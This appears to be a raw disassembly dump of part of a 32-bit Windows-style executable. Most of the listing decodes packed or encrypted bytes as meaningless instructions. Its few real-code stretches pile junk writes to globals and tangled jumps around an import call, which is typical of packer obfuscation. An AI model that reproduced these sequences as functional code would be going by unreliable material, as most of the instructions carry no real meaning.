  40a583:	ins    DWORD PTR es:[edi],dx
  40a584:	(bad)  
  40a586:	sub    edx,DWORD PTR [ecx+0x5114483c]
  40a58c:	adc    cl,BYTE PTR [ebx-0x69]
  40a58f:	inc    ebx
  40a590:	mov    al,ds:0x6be99ae8
  40a595:	retf   
  40a596:	sbb    esp,eax
  40a598:	push   esp
  40a599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a59a:	clc    
  40a59b:	int3   
  40a59c:	jae    0x40a561
  40a59e:	das    
  40a59f:	aam    0x84
  40a5a1:	popf   
  40a5a2:	mov    eax,0xbd0370
  40a5a7:	adc    ebp,DWORD PTR [esi]
  40a5a9:	fidiv  DWORD PTR [edi]
  40a5ab:	or     edx,DWORD PTR [ebx-0x70fdc929]
  40a5b1:	(bad)  [edi+0xbda33cd]
  40a5b7:	inc    esp
  40a5b8:	lods   al,BYTE PTR ds:[esi]
  40a5b9:	push   ebp
  40a5ba:	mov    bl,0xe6
  40a5bc:	mov    edx,0x12f32586
  40a5c1:	or     BYTE PTR [edi],ah
  40a5c3:	jns    0x40a59e
  40a5c5:	adc    DWORD PTR [edi],0xffffff87
  40a5c8:	call   0xa82c:0x197c84e3
  40a5cf:	dec    ecx
  40a5d0:	mov    BYTE PTR [esi-0x304021d7],ah
  40a5d6:	pop    ecx
  40a5d7:	jbe    0x40a5dd
  40a5d9:	test   BYTE PTR [ecx+ebx*8],0x7f
  40a5dd:	cwde   
  40a5de:	mov    DWORD PTR [edi+0x6],0x3701c9e1
  40a5e5:	mov    esi,0x93b97c00
  40a5ea:	and    BYTE PTR [edi+0x5941f872],bl
  40a5f0:	stos   BYTE PTR es:[edi],al
  40a5f1:	bnd jg 0x40a659
  40a5f4:	pop    ds
  40a5f5:	clc    
  40a5f6:	xor    esi,DWORD PTR [ecx]
  40a5f8:	fiadd  DWORD PTR [edi]
  40a5fa:	and    BYTE PTR [ecx],bh
  40a5fc:	adc    dh,BYTE PTR [esi+0x7]
  40a5ff:	(bad)  
  40a600:	mov    esi,0xb0fe403e
  40a605:	outs   dx,DWORD PTR ds:[esi]
  40a606:	push   cs
  40a607:	pop    esi
  40a608:	xchg   ah,ch
  40a60a:	jge    0x40a610
  40a60c:	xchg   ebp,eax
  40a60d:	dec    edx
  40a60e:	iret   
  40a60f:	mov    WORD PTR [ecx+eax*2-0x42ee37d2],gs
  40a616:	fstp   DWORD PTR [ebp+0x4143148b]
  40a61c:	or     ah,cl
  40a61e:	loopne 0x40a5b7
  40a620:	mov    ah,0xd0
  40a622:	(bad)  
  40a623:	je     0x40a62a
  40a625:	fiadd  DWORD PTR [edx]
  40a627:	aaa    
  40a628:	cli    
  40a629:	test   DWORD PTR [esi-0x29],ebx
  40a62c:	outs   dx,BYTE PTR ds:[esi]
  40a62d:	push   ss
  40a62e:	mov    edx,0x28b17f6
  40a633:	retf   
  40a634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a635:	push   esi
  40a636:	(bad)  
  40a637:	jge    0x40a684
  40a639:	icebp  
  40a63a:	sub    ch,0x3e
  40a63d:	out    dx,eax
  40a63e:	xchg   edx,eax
  40a63f:	fistp  QWORD PTR [esi+0x68b88061]
  40a645:	jp     0x40a6ba
  40a647:	loope  0x40a64a
  40a649:	jae    0x40a6bb
  40a64b:	jns    0x40a692
  40a64d:	or     eax,0xba8a7792
  40a652:	jecxz  0x40a6b1
  40a654:	pushf  
  40a655:	shl    BYTE PTR [edi-0x8a99907],0xc5
  40a65c:	(bad)  
  40a65d:	xor    DWORD PTR [ebx+eax*8+0x69],esi
  40a661:	dec    edx
  40a662:	aam    0x8c
  40a664:	ds jae 0x40a6a4
  40a667:	inc    ecx
  40a668:	mov    dl,0x3
  40a66a:	mov    esi,0x527d99fb
  40a66f:	mov    ah,0xd3
  40a671:	adc    DWORD PTR ds:0x73efc157,esi
  40a677:	sti    
  40a678:	dec    edi
  40a679:	mov    BYTE PTR [ecx+ecx*2-0xb],bh
  40a67d:	or     eax,0xce7662e0
  40a682:	ret    0xab3f
  40a685:	fisttp QWORD PTR [ebx+0x2e]
  40a688:	inc    edi
  40a689:	push   edx
  40a68a:	test   bh,cl
  40a68c:	ret    
  40a68d:	add    ch,BYTE PTR [di-0x7df6]
  40a692:	cli    
  40a693:	dec    edi
  40a694:	(bad)  
  40a695:	pop    eax
  40a696:	(bad)  
  40a698:	int3   
  40a699:	or     eax,DWORD PTR [edi-0x27]
  40a69c:	int3   
  40a69d:	std    
  40a69e:	mov    ds:0x13495b76,al
  40a6a3:	iret   
  40a6a4:	cmp    DWORD PTR [edi],esi
  40a6a6:	mov    bl,0x93
  40a6a8:	cmp    dh,bh
  40a6aa:	loopne 0x40a6cd
  40a6ac:	inc    esi
  40a6ad:	inc    edx
  40a6ae:	arpl   bp,si
  40a6b0:	iret   
  40a6b1:	aas    
  40a6b2:	xor    eax,0x7615a1e6
  40a6b7:	inc    eax
  40a6b8:	add    al,BYTE PTR [esi+0x79]
  40a6bb:	mov    dl,0xfa
  40a6bd:	mov    al,BYTE PTR [ecx]
  40a6bf:	xchg   esi,edx
  40a6c1:	inc    edx
  40a6c2:	pop    edi
  40a6c3:	sub    eax,0x541f4ecf
  40a6c8:	std    
  40a6c9:	mov    bl,0xe2
  40a6cb:	add    eax,0xf3610b03
  40a6d0:	or     al,0x8e
  40a6d2:	mov    ah,BYTE PTR [eax-0x11]
  40a6d5:	push   ebp
  40a6d6:	push   esp
  40a6d7:	xchg   edi,eax
  40a6d8:	cmp    BYTE PTR [eax+0x5a03a93a],bl
  40a6de:	or     bl,dh
  40a6e0:	add    DWORD PTR [edi+0x18],ebp
  40a6e3:	and    eax,0xd9fc54a3
  40a6e8:	mov    BYTE PTR [ecx+0x3b1cb019],cl
  40a6ee:	clc    
  40a6ef:	mov    DWORD PTR ds:0x43366b,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x433657,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x4336e7,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433717
  40a72f:	or     DWORD PTR ds:0x433723,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433713,0x433607
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x4336af,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x433667,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x4336ef,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x4335ff,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x4336db
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43360b
  40a793:	sub    DWORD PTR ds:0x433623,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0x470eec0c
  40a7ac:	adc    BYTE PTR [esi+edx*1+0x387e7eed],dl
  40a7b3:	jl     0x40a833
  40a7b5:	jle    0x40a751
  40a7b7:	mov    bh,0x7f
  40a7b9:	fdivr  st(1),st
  40a7bb:	imul   ecx,DWORD PTR [edi],0x845b7d43
  40a7c1:	lods   al,BYTE PTR ds:[esi]
  40a7c2:	xor    ebx,eax
  40a7c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7c5:	ins    BYTE PTR es:[edi],dx
  40a7c6:	jne    0x40a776
  40a7c8:	jbe    0x40a83a
  40a7ca:	fisttp QWORD PTR [eax+0x77]
  40a7cd:	or     BYTE PTR [ebx+0x22],dh
  40a7d0:	aas    
  40a7d1:	lahf   
  40a7d2:	mov    cs,WORD PTR [edi]
  40a7d4:	adc    eax,0x3cfcef94
  40a7d9:	test   BYTE PTR [eax+edi*8-0x58],bl
  40a7dd:	adc    BYTE PTR [eax],0x5e
  40a7e0:	cmp    al,0x5d
  40a7e2:	xchg   esp,eax
  40a7e3:	neg    BYTE PTR [ecx+ecx*1]
  40a7e6:	psadbw mm1,QWORD PTR [esi-0x18f3df61]
  40a7ed:	fdivr  DWORD PTR ds:0x2011522d
  40a7f3:	xor    edx,edi
  40a7f5:	or     al,0xc7
  40a7f7:	mov    DWORD PTR gs:[eax+0x2209adaa],0x702d0c34
  40a802:	jecxz  0x40a7b7
  40a804:	push   ebp
  40a805:	mov    ebp,0xc840ea29
  40a80a:	push   esp
  40a80b:	inc    edx
  40a80c:	pop    es
  40a80d:	jo     0x40a839
  40a80f:	push   es
  40a810:	mov    esi,0xf4965a6
  40a815:	sub    DWORD PTR [ebx],esi
  40a817:	popa   
  40a818:	mov    dh,0xfa
  40a81a:	mov    al,ds:0x4578b010
  40a81f:	or     BYTE PTR [esi+0x62],bl
  40a822:	or     eax,0xf9944b9a
  40a827:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40a829:	leave  
  40a82a:	lahf   
  40a82b:	sahf   
  40a82c:	clc    
  40a82d:	mov    WORD PTR [ebp-0x60aca433],gs
  40a833:	dec    esp
  40a834:	mov    bh,0xf
  40a836:	ret    
  40a837:	(bad)  
  40a838:	sbb    dl,bh
  40a83a:	inc    eax
  40a83b:	int    0x15
  40a83d:	je     0x40a89b
  40a83f:	inc    eax
  40a840:	adc    DWORD PTR [edx-0x11],esi
  40a843:	sub    DWORD PTR [esi-0x539df0b0],ebx
  40a849:	out    0xdb,eax
  40a84b:	sbb    al,0x96
  40a84d:	cmp    BYTE PTR [ebx],bl
  40a84f:	add    ebp,DWORD PTR [ebp-0x44]
  40a852:	mov    eax,0x6a40befe
  40a857:	enter  0x636d,0xf8
  40a85b:	pusha  
  40a85c:	(bad)  [esi]
  40a85e:	mov    DWORD PTR [edx],edi
  40a860:	jmp    0x872f:0x379cc53
  40a867:	(bad)  
  40a868:	hlt    
  40a869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a86a:	mov    ecx,DWORD PTR [edi-0x50e0e3ce]
  40a870:	push   esp
  40a871:	(bad)  
  40a872:	xchg   ebx,eax
  40a873:	inc    ebx
  40a874:	cwde   
  40a875:	pop    eax
  40a876:	loope  0x40a878
  40a878:	iret   
  40a879:	push   esp
  40a87a:	retf   
  40a87b:	aaa    
  40a87c:	fwait
  40a87d:	lods   al,BYTE PTR ds:[esi]
  40a87e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a87f:	arpl   WORD PTR ds:0x9dbd250a,bp
  40a885:	pop    ebx
  40a886:	in     al,dx
  40a887:	jle    0x40a825
  40a889:	call   0xbf421581
  40a88e:	or     al,0x2c
  40a890:	test   DWORD PTR [esi+0x6],esi
  40a893:	(bad)  
  40a894:	cmp    esi,DWORD PTR [edi]
  40a896:	outs   dx,BYTE PTR ds:[esi]
  40a897:	lods   al,BYTE PTR ds:[esi]
  40a898:	das    
  40a899:	lea    ecx,[ebx]
  40a89b:	and    DWORD PTR [ebx+0x55736ae1],0xffffffab
  40a8a2:	xor    BYTE PTR [edi],dh
  40a8a4:	cs push edi
  40a8a6:	lods   eax,DWORD PTR ds:[esi]
  40a8a7:	fcmove st,st(1)
  40a8a9:	out    0x46,al
  40a8ab:	mov    ds:0x86757791,eax
  40a8b0:	mov    eax,ds:0x511c4486
  40a8b5:	cmp    dl,bl
  40a8b7:	mov    cl,0xec
  40a8b9:	ret    
  40a8ba:	test   DWORD PTR [ebx+ebp*8-0x6968562d],ecx
  40a8c1:	pop    ebp
  40a8c2:	mov    eax,0x2a935863
  40a8c7:	loopne 0x40a8c8
  40a8c9:	xor    ebp,DWORD PTR [ebx]
  40a8cb:	imul   ebx,DWORD PTR [edx-0x57],0x4f
  40a8cf:	dec    ebp
  40a8d0:	sahf   
  40a8d1:	ja     0x40a85f
  40a8d3:	pusha  
  40a8d4:	sub    bh,BYTE PTR [edi+edx*2+0x2a]
  40a8d8:	call   0xf517:0xecaa4211
  40a8df:	sti    
  40a8e0:	out    0xe7,eax
  40a8e2:	jnp    0x40a8e1
  40a8e4:	into   
  40a8e5:	inc    DWORD PTR [ebx+0x5]
  40a8e8:	push   DWORD PTR [edi]
  40a8ea:	icebp  
  40a8eb:	mov    ecx,0x146bbd2f
  40a8f0:	push   cs
  40a8f1:	inc    esi
  40a8f2:	bound  ecx,QWORD PTR [esi+eax*4-0x66]
  40a8f6:	mov    cl,0x3a
  40a8f8:	std    
  40a8f9:	bound  edi,QWORD PTR [esi-0xbfbe94a]
  40a8ff:	mov    eax,0x699ff059
  40a904:	rcl    DWORD PTR [ebx],cl
  40a906:	and    al,0xc
  40a908:	jb     0x40a937
  40a90a:	aaa    
  40a90b:	pop    eax
  40a90c:	ja     0x40a951
  40a90e:	ud1    ecx,DWORD PTR [ecx+ecx*2]
  40a912:	adc    bl,BYTE PTR [edx-0x50]
  40a915:	test   BYTE PTR [ecx-0x1e],al
  40a918:	adc    esp,DWORD PTR [edx-0x7206171c]
  40a91e:	iret   
  40a91f:	mov    dh,0x9b
  40a921:	pop    edx
  40a922:	enter  0x8eb8,0x31
  40a926:	mov    eax,ds:0xb3e7b512
  40a92b:	addr16 (bad) 
  40a92e:	and    al,cl
  40a930:	push   ds
  40a931:	or     DWORD PTR [ecx+edi*1-0x1a1613],ebx
  40a938:	sar    BYTE PTR [ebx-0xfe98493],1
  40a93e:	mov    ah,0x9f
  40a940:	jmp    0xd9f9:0x8362bd80
  40a947:	mov    eax,ds:0x2843e245
  40a94c:	ja     0x40a982
  40a94e:	cwde   
  40a94f:	mov    eax,0xa618613a
  40a954:	arpl   WORD PTR [ecx+0xe],sp
  40a957:	ret    0xc937
  40a95a:	stos   BYTE PTR es:[edi],al
  40a95b:	mov    edx,0xb4b6121a
  40a960:	loope  0x40a9da
  40a962:	sbb    DWORD PTR [ecx],ebp
  40a964:	out    dx,al
  40a965:	push   ebx
  40a966:	fsubr  st(0),st
  40a968:	jo     0x40a965
  40a96a:	mov    eax,0xc89d0cf3
  40a96f:	xchg   esp,eax
  40a970:	repz push ebp
  40a972:	cwde   
  40a973:	imul   ax,WORD PTR [eax+edx*1],0x37
  40a978:	adc    eax,0xcbb7c819
  40a97d:	sti    
  40a97e:	test   al,0x2f
  40a980:	out    dx,al
  40a981:	sar    edi,1
  40a983:	sti    
  40a984:	ffree  st(3)
  40a986:	sub    BYTE PTR [eax],bl
  40a988:	(bad)
  40a98b:	push   edx
  40a98c:	adc    edi,0x36d9ef4d
  40a992:	add    BYTE PTR [edi],ah
  40a994:	jne    0x40a9cf
  40a996:	pusha  
  40a997:	mov    bh,0xd6
  40a999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a99a:	inc    ebx
  40a99b:	add    ch,al
  40a99d:	cmp    DWORD PTR ds:0x5a96785,0xffffffc6
  40a9a5:	add    DWORD PTR [edi-0x23],0x7b
  40a9a9:	idiv   BYTE PTR es:[eax-0x49]
  40a9ad:	js     0x40a9fd
  40a9af:	push   ss
  40a9b0:	adc    BYTE PTR [edi+0x40519f0a],cl
  40a9b6:	adc    ebp,DWORD PTR [edi-0x14]
  40a9b9:	jle    0x40a99a
  40a9bb:	ror    DWORD PTR [ebx+0x3d],1
  40a9be:	pop    ds
  40a9bf:	mov    ah,0x4a
  40a9c1:	jno    0x40a9a3
  40a9c3:	add    eax,0xd077fe75
  40a9c8:	mov    ds:0x5c040de9,al
  40a9cd:	or     BYTE PTR [ecx-0x14],0xe4
  40a9d1:	xchg   edi,eax
  40a9d2:	adc    DWORD PTR [eax+ebx*1-0x39],esp
  40a9d6:	(bad)  
  40a9d8:	xor    DWORD PTR [edi-0x73f24c91],0x1f8e34d1
  40a9e2:	nop
  40a9e3:	xchg   esp,eax
  40a9e4:	sub    BYTE PTR ds:0xf10da470,0xa
  40a9eb:	sub    al,0xfa
  40a9ed:	mov    dl,0x15
  40a9ef:	cwde   
  40a9f0:	xor    ebp,eax
  40a9f2:	adc    BYTE PTR [ebx-0x68],ch
  40a9f5:	in     eax,dx
  40a9f6:	cmp    eax,0x6270bdf4
  40a9fb:	fisttp WORD PTR [ecx+0x458bec45]
  40aa01:	cld    
  40aa02:	xor    DWORD PTR ds:0x433617,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433717,0x4336e7
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x433667,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	xchg   edx,eax
  40aa35:	pop    edx
  40aa36:	jno    0x40a9e2
  40aa38:	shr    bl,1
  40aa3a:	jle    0x40aaba
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	popf   
  40aa41:	pop    esi
  40aa42:	aaa    
  40aa43:	out    0x7a,al
  40aa45:	lahf   
  40aa46:	sar    DWORD PTR [eax+0xf370304],1
  40aa4c:	push   ecx
  40aa4d:	dec    edi
  40aa4e:	sub    ah,cl
  40aa50:	jle    0x40aa9f
  40aa52:	arpl   ax,sp
  40aa54:	sub    al,0x6e
  40aa56:	push   edx
  40aa57:	repnz fdivr QWORD PTR [edx-0x28dbc5f3]
  40aa5e:	test   al,0x87
  40aa60:	(bad)  
  40aa61:	and    DWORD PTR [esi+0x65a8b7b9],0x47
  40aa68:	jp     0x40aa39
  40aa6a:	push   0x115fcfe6
  40aa6f:	mov    BYTE PTR [ebp+ebp*1-0x771c88e5],al
  40aa76:	mov    esp,0x207827d0
  40aa7b:	cmp    BYTE PTR [esi+0x12019a3c],dh
  40aa81:	push   ecx
  40aa82:	xor    eax,0x634e5db7
  40aa87:	in     eax,0xa0
  40aa89:	and    eax,0x3f42dc80
  40aa8e:	jnp    0x40aade
  40aa90:	sub    ah,BYTE PTR [edx]
  40aa92:	push   cs
  40aa93:	hlt    
  40aa94:	pop    ecx
  40aa95:	sub    ch,bl
  40aa97:	fcomp  DWORD PTR [esi+0x74]
  40aa9a:	out    dx,eax
  40aa9b:	aad    0xea
  40aa9d:	pand   mm3,mm1
  40aaa0:	aam    0xe1
  40aaa2:	icebp  
  40aaa3:	(bad)  
  40aaa4:	xor    edi,edx
  40aaa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aaa7:	xlat   BYTE PTR ds:[ebx]
  40aaa8:	scas   eax,DWORD PTR es:[edi]
  40aaa9:	mov    cs,WORD PTR [ecx+eax*8+0x19bd2bf5]
  40aab0:	sub    ah,BYTE PTR [edi+0x2ca6cd37]
  40aab6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aab7:	pop    edi
  40aab8:	iret   
  40aab9:	je     0x40aa49
  40aabb:	not    DWORD PTR [eax+0x447a10dd]
  40aac1:	mov    ebx,0xa49d56bc
  40aac6:	mov    ebp,0x5a6f6f1
  40aacb:	sbb    al,0x39
  40aacd:	je     0x40aadc
  40aacf:	popf   
  40aad0:	les    eax,FWORD PTR [ebx+0x73]
  40aad3:	xchg   esi,eax
  40aad4:	int    0x30
  40aad6:	add    BYTE PTR [ebp+0x5a],bh
  40aad9:	pop    ss
  40aada:	mov    edx,ecx
  40aadc:	pop    ebx
  40aadd:	cmc    
  40aade:	test   al,0xe2
  40aae0:	cmp    ecx,DWORD PTR [esi-0x6385960b]
  40aae6:	cdq    
  40aae7:	aaa    
  40aae8:	push   es
  40aae9:	js     0x40ab4f
  40aaeb:	lahf   
  40aaec:	add    ebp,edx
  40aaee:	mov    cl,BYTE PTR [ebp+0x5e]
  40aaf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaf2:	mov    ah,0xfe
  40aaf4:	dec    edx
  40aaf5:	sahf   
  40aaf6:	cmp    DWORD PTR [edx],0x1384edac
  40aafc:	adc    dh,0xe9
  40aaff:	outs   dx,DWORD PTR ds:[esi]
  40ab00:	sahf   
  40ab01:	scas   al,BYTE PTR es:[edi]
  40ab02:	fild   WORD PTR [eax+ebx*4+0x4405dc91]
  40ab09:	mov    al,ds:0x9950a5fb
  40ab0e:	sub    eax,0x8ca045e4
  40ab13:	out    dx,al
  40ab14:	mov    ah,0xd5
  40ab16:	sub    bh,bl
  40ab18:	mov    esp,0x3447a156
  40ab1d:	cmp    BYTE PTR [ebx],0xe8
  40ab20:	mov    edx,0xa5ac4783
  40ab25:	and    esi,DWORD PTR [ebx-0x728a416a]
  40ab2b:	out    0xb8,al
  40ab2d:	test   DWORD PTR [edi],ecx
  40ab2f:	mov    DWORD PTR [ecx],ebx
  40ab31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab32:	or     DWORD PTR [esi+0x15],esi
  40ab35:	push   edx
  40ab36:	sar    ah,cl
  40ab38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab39:	retf   0x577
  40ab3c:	and    BYTE PTR [esi+0x35],ch
  40ab3f:	push   eax
  40ab40:	add    al,0x17
  40ab42:	pop    esp
  40ab43:	jb     0x40abb2
  40ab45:	xor    edi,eax
  40ab47:	mov    cl,0x67
  40ab49:	inc    ebx
  40ab4a:	xchg   ebx,eax
  40ab4b:	retf   0xeee7
  40ab4e:	bound  edi,QWORD PTR fs:[esi]
  40ab51:	ds and eax,0xb2d6cf59
  40ab57:	xchg   ecx,eax
  40ab58:	sbb    BYTE PTR [ecx+ebx*1],bl
  40ab5b:	sbb    ch,BYTE PTR [ecx+0xe]
  40ab5e:	out    0xf9,eax
  40ab60:	jns    0x40ab85
  40ab62:	pop    esi
  40ab63:	pop    ds
  40ab64:	and    dl,BYTE PTR [ecx-0x76]
  40ab67:	shl    eax,1
  40ab69:	jge    0x40ab90
  40ab6b:	cwde   
  40ab6c:	adc    ebp,DWORD PTR [eax]
  40ab6e:	in     eax,dx
  40ab6f:	xchg   ebp,eax
  40ab70:	pop    ebp
  40ab71:	mov    ch,0xb3
  40ab73:	inc    ebx
  40ab74:	mov    DWORD PTR [esp+esi*4+0x57],ebx
  40ab78:	mov    ?,WORD PTR [esi+0x75]
  40ab7b:	cwde   
  40ab7c:	test   DWORD PTR [ebx-0x10],0x5a4a709e
  40ab83:	mov    dh,0x89
  40ab85:	push   esp
  40ab86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab87:	in     al,0x69
  40ab89:	cmp    eax,0xcb7c2b65
  40ab8e:	cli    
  40ab8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab90:	retf   0x89b0
  40ab93:	das    
  40ab94:	ror    DWORD PTR [esi+0x1c],0xd7
  40ab98:	inc    edi
  40ab99:	xchg   ebp,eax
  40ab9a:	inc    ebp
  40ab9b:	xor    BYTE PTR [eax],ah
  40ab9d:	dec    esp
  40ab9e:	lahf   
  40ab9f:	cmp    eax,0xbfe14dfc
  40aba4:	ins    BYTE PTR es:[edi],dx
  40aba5:	es ds dec ebp
  40aba8:	imul   edi,DWORD PTR [ecx-0x270628e2],0xdcf2faf0
  40abb2:	out    0x41,eax
  40abb4:	repnz stos DWORD PTR es:[edi],eax
  40abb6:	mov    ds:0xddc93a69,eax
  40abbb:	outs   dx,BYTE PTR ds:[esi]
  40abbc:	pusha  
  40abbd:	arpl   WORD PTR [edi-0x381ef86b],di
  40abc3:	pop    esp
  40abc4:	and    eax,0x4c7aad11
  40abc9:	je     0x40ab6a
  40abcb:	cmp    al,0xc1
  40abcd:	js     0x40abb9
  40abcf:	popa   
  40abd0:	sub    eax,0x6acf90bf
  40abd5:	sbb    ebx,DWORD PTR [edi-0x124e6958]
  40abdb:	loop   0x40abe7
  40abdd:	mov    ecx,0x7a651092
  40abe2:	push   ds
  40abe3:	xchg   BYTE PTR [edx+ebp*8-0x7f],al
  40abe7:	mov    bl,0x76
  40abe9:	mov    BYTE PTR ss:[ebp-0x6f],bl
  40abed:	xchg   ecx,eax
  40abee:	ret    
  40abef:	cmp    bl,ch
  40abf1:	xchg   BYTE PTR [esi+0x7cff7020],bl
  40abf7:	fcomp  DWORD PTR [ebx+0x4ab49a79]
  40abfd:	rep outs dx,BYTE PTR ds:[esi]
  40abff:	stos   BYTE PTR es:[edi],al
  40ac00:	mov    ch,0x86
  40ac02:	enter  0x417b,0xb5
  40ac06:	sbb    eax,0x44e0a30a
  40ac0b:	loop   0x40abaa
  40ac0d:	xchg   ecx,eax
  40ac0e:	loopne 0x40ac20
  40ac10:	repnz repnz mov esp,0xb3e7e2b
  40ac17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac18:	push   ss
  40ac19:	sbb    ebx,edi
  40ac1b:	cdq    
  40ac1c:	sub    cl,dl
  40ac1e:	(bad)  
  40ac1f:	cli    
  40ac20:	retf   0xb3b6
  40ac23:	lahf   
  40ac24:	mov    bh,0xf0
  40ac26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac27:	inc    ebx
  40ac28:	mov    edi,0xaeecd571
  40ac2d:	sbb    eax,DWORD PTR [edx+0x5d5ba8cc]
  40ac33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac34:	shl    DWORD PTR [esi-0x1d2291c3],1
  40ac3a:	sub    DWORD PTR [ecx],ebx
  40ac3c:	popf   
  40ac3d:	add    cl,BYTE PTR [ecx]
  40ac3f:	out    dx,eax
  40ac40:	pusha  
  40ac41:	enter  0xded1,0xf1
  40ac45:	test   al,0xf9
  40ac47:	ins    DWORD PTR es:[edi],dx
  40ac48:	test   BYTE PTR [edx],0x8
  40ac4b:	aam    0xfc
  40ac4d:	and    DWORD PTR [edi+ecx*2-0x7d15ace3],eax
  40ac54:	pop    ecx
  40ac55:	jmp    0x1008:0xc6a13c2f
  40ac5c:	fidivr WORD PTR [esi-0x2d]
  40ac5f:	lds    ecx,FWORD PTR [ecx]
  40ac61:	xchg   ebx,eax
  40ac62:	leave  
  40ac63:	retf   0xc4cc
  40ac66:	mov    edx,0x6b1b1ff2
  40ac6b:	adc    bl,ch
  40ac6d:	arpl   WORD PTR [edi+0x618a9490],dx
  40ac73:	jne    0x40acef
  40ac75:	pop    edi
  40ac76:	add    esp,DWORD PTR [esi+ebp*8-0x799963fe]
  40ac7d:	and    al,BYTE PTR [eax-0xd]
  40ac80:	sbb    DWORD PTR [ebp+0xb],edi
  40ac83:	stos   BYTE PTR es:[edi],al
  40ac84:	scas   al,BYTE PTR es:[edi]
  40ac85:	push   ecx
  40ac86:	cmp    ecx,eax
  40ac88:	je     0x40b9ed
  40ac8e:	sbb    DWORD PTR ds:0x43366b,0x7413
  40ac98:	mov    eax,DWORD PTR [ebp-0x14]
  40ac9b:	and    DWORD PTR ds:0x4336ef,0x0
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x4336ef
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x4336ef,ecx
  40acb4:	cmp    DWORD PTR ds:0x4336ef,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433788
  40acc6:	push   0x4337cc
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x4336ef,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x4336ef
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x4336ef,ecx
  40acf7:	cmp    DWORD PTR ds:0x4336ef,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43369f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi+0x177423ba],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40acd3
  40ad2c:	not    DWORD PTR [esi+0x13a7ffe2]
  40ad32:	jns    0x40ad2b
  40ad34:	mov    dl,0xc8
  40ad36:	scas   eax,DWORD PTR es:[edi]
  40ad37:	push   ss
  40ad38:	in     eax,0xc2
  40ad3a:	arpl   WORD PTR [ecx],cx
  40ad3c:	cli    
  40ad3d:	les    ebx,FWORD PTR [ebx-0x1a38e0fe]
  40ad43:	add    eax,0xd8da4b6
  40ad48:	mov    esi,DWORD PTR [esi+0x18]
  40ad4b:	sti    
  40ad4c:	mov    eax,ds:0x7af9fd72
  40ad51:	push   edi
  40ad52:	ins    BYTE PTR es:[edi],dx
  40ad53:	mov    ch,0x7a
  40ad55:	sub    al,BYTE PTR [ebx]
  40ad57:	push   ecx
  40ad58:	jmp    0x40ace3
  40ad5a:	pop    edi
  40ad5b:	getsec 
  40ad5d:	call   0xc931e7a5
  40ad62:	data16 bnd jp 0x40ad42
  40ad66:	pop    ecx
  40ad67:	ficomp DWORD PTR [edx+0x47]
  40ad6a:	dec    ebp
  40ad6b:	outs   dx,BYTE PTR ds:[esi]
  40ad6c:	popa   
  40ad6d:	inc    ecx
